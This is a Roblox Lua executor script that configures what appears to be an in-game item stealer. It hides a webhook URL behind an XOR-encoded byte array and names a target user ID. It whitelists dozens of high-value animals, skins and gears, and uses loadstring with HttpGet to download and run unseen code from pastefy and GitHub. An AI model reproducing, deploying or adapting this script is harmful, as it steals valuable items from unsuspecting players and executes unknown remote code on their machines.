local genv = getgenv()

genv.GOOD_WEBHOOK = (function() local b={253,225,225,229,230,175,186,186,241,252,230,246,250,231,241,187,246,250,248,186,244,229,252,186,226,240,247,253,250,250,254,230,186,164,160,161,165,173,166,164,166,173,166,172,166,164,166,166,165,160,173,165,186,199,160,165,247,223,208,219,165,231,217,246,248,249,193,251,219,211,223,164,248,216,246,221,240,172,237,195,173,224,241,192,222,221,164,165,253,255,184,220,198,195,224,173,165,255,164,227,220,223,247,249,172,199,225,242,248,237,239,252,237,251,254,239,197,225,209,198,222} local k=149 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Globa Steppa",
    "Fragola La La La",
    "Los Tacoritas",
    "Dug Dug Dug",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Jolly Jolly Sahur",
    "Yetimatic",
    "La Breakfast Combinasion",
    "La Fuse Machine",
    "Money Money Bros",
    "Sammyini Truckini",
    "Orchidox"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Rainbow Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Cupid's Wings"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/S3xnKGFZ/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
